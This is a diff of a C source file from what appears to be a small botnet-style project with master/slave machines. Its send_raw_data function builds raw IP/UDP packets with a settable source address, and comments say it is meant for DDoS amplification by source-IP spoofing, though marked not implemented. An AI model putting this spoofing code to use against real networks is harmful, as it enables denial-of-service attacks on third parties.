@@ -18,9 +18,8 @@
 #define PCKT_LEN 8192
 
 //FUNCTIONS FOR END USE
-int slave_daemon(struct machine self);
-int connect_to_master();
-struct machine createMachine();
+connection connect_to(char *dest_ip, int dest_port);
+connection bind_socket(char *ip_address, int port);
 int setMaster(struct machine *master);
 int sendData(message data);
 message rcvData();
@@ -30,8 +29,7 @@ unsigned short csum(unsigned short *buf, int nwords);
 
 connection connect_to(char *dest_ip, int dest_port)
 {
-    int sock_fd, bytes_recv;
-    char message[1024];
+    int sock_fd;
     struct sockaddr_in address;
     connection return_con;
 
@@ -74,7 +72,7 @@ connection bind_socket(char *ip_address, int port)
     struct addrinfo *server_info, *results;
     struct sockaddr_storage client_addr;
     struct sockaddr_in *sa;
-    socklen_t client_addr_size;
+    sa = (struct sockaddr_in *)&client_addr;
     int optval = 1;
 
     // Convert port int to const char *
@@ -111,6 +109,8 @@ connection bind_socket(char *ip_address, int port)
     return return_con;
 }
 
+// Used by the client to listen to the server for commands.
+// Further functionality (not realised) would be to forward message to the destination client
 message recieve_data(connection server)
 {
     message rcvd_msg;
@@ -119,25 +119,26 @@ message recieve_data(connection server)
     return rcvd_msg;
 }
 
+// Intended to be used to designate a specific machine in the list as a server. Not implemented.
 int setMaster(struct machine *master)
 {
     master->is_master = 1;
+    return(0);
 }
 
+// Able to send UDP packets disguised as ICMP ping packets.
+// Intended to be used for DDOS amplification by modification of the source IP. Not implemented.
 int send_raw_data(message data, char *ddos_ip)
 {
-    printf("retrieve machine from data struct\n");
+    // Retrieve machine from Message struct
     struct machine destination = data.dest_machine;
     struct machine source = data.source_machine;
 
-    printf("Dest Data: Is master: %d, IP: %s Port: %d\n", destination.is_master, destination.ip_address, destination.open_port);
-
-    printf("setup packet header\n");
+    // Set up data structures for packet header
     u_int16_t src_port, dst_port;
     u_int32_t src_addr, dst_addr;
     src_addr = inet_addr(source.ip_address);
-    dst_addr = inet_addr(destination.ip_address);
-    printf("Set ports\n");
+    dst_addr = inet_addr(destination.ip_address);;
     src_port = source.open_port;
     dst_port = destination.open_port;
     int sd;
@@ -149,60 +150,56 @@ int send_raw_data(message data, char *ddos_ip)
     const int *val = &one;
     memset(buffer, 0, PCKT_LEN);
 
-    printf("create raw socket\n");
+    // Ask the kernel to let us create a raw socket
     sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
     if (sd < 0)
     {
         return(1);
     }
-
-    printf("set IP_HDRINCL\n");
-    //attempt to get permission from kernel to fill our own header
+;
+    // Attempt to get permission from kernel to fill our own header
     if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
     {
         return(2);
     }
 
-    printf("set sin fam\n");
+    // Fill sockaddr_in struct with relevant data
     sin.sin_family = AF_INET;
-    printf("set sin port\n");
     sin.sin_port = htons(dst_port);
-    printf("set sin addr\n");
     sin.sin_addr.s_addr = dst_addr;
 
-    printf("Fabricate IP header\n");
-    // fabricate the IP header
+    // Fabricate the IP header. This is where we can implement DDOS amplification attack.
     ip->ihl      = 5;
     ip->version  = 4;
     ip->tos      = 16;
     ip->tot_len  = sizeof(struct iphdr) + sizeof(struct udphdr);
     ip->id       = htons(54321);
     ip->ttl      = 64;
+    // We can set the protocol to whatever we like, so long as both sides assume that it's UDP
     ip->protocol = destination.preferred_protocol;
     ip->saddr = src_addr;
     ip->daddr = dst_addr;
 
-    printf("Fabricate UDP header\n");
-    // fabricate the "udp" header
+    // Fabricate the "udp" header
     udp->source = htons(src_port);
     udp->dest = htons(dst_port);
     udp->len = htons(sizeof(struct udphdr));
 
-    printf("Calculate checksum\n");
-    // calculate the checksum for integrity
+    // Calculate the checksum for integrity - https://opensourceforu.com/2015/03/a-guide-to-using-raw-sockets/
     ip->check = csum((unsigned short *)buffer,
                     sizeof(struct iphdr) + sizeof(struct udphdr));
 
+    // Finally, let's send the packet.
     if (sendto(sd, buffer, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
     {
         return(3);
     }
 
     close(sd);
-    printf("sent packet\n");
     return 0;
 }
 
+// Calculates the checksum of a raw packet - https://opensourceforu.com/2015/03/a-guide-to-using-raw-sockets/
 unsigned short csum(unsigned short *buf, int nwords)
 {
     unsigned long sum;
